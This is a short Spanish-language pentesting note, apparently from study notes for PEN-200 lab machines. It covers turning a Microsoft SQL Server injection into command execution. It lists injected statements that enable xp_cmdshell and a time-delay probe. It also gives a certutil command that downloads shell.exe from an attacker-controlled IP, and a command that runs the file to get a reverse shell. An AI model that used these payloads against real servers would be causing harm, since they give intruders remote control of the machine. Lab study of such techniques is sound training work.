
## DESCRIPTION

Detectamos una inyección SQL y comprobamos si es posible ejecutar comandos.

En el caso de qu sea una BlindSQL podemos comprobarlo con un retraso de tiempo: `' WAITFOR DELAY '0:0:10'--`

#### Mas información
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

## EXPLOITATION

### OPTION 1: EXECUTING COMMAND WITH XP_CMDEXE

**!!NOTA IMPORTANTE!!** 

ES MUY IMPORANTE HABILITAR ANTE EL xp_cmdshell PARA QUE PODAMOS EJECUTAR COMANDOS

```
' EXEC sp_configure 'show advanced options',1 -- -
' RECONFIGURE -- -
' EXEC sp_configure 'xp_cmdshell',1 -- -
' RECONFIGURE -- -
```

1. Levantamos un servidor en nuestro equipo y comprobamos que ser realiza la petición

```
' exec xp_cmdshell 'certutil -urlcache -f http://192.168.119.122:8000/shell.exe C://programdata/shell.exe' -- 
```

![[Pasted image 20230401203637.png]]
Creamos la reverse shell y la descargamos.

**!!NOTA IMPORTANTE!!** 
Tiene que ser en un directorio donde tengamos permisos por ejemplo PROGRAMDATA

2. Nos ponemos a la escucha en nuestra maquina

3. La ejecutamos directamente:

```
' exec xp_cmdshell 'C://programdata/shell.exe' --  
```



## MACHINES

* Laboratorios PEN-200: Medtech (192.168.122.121)
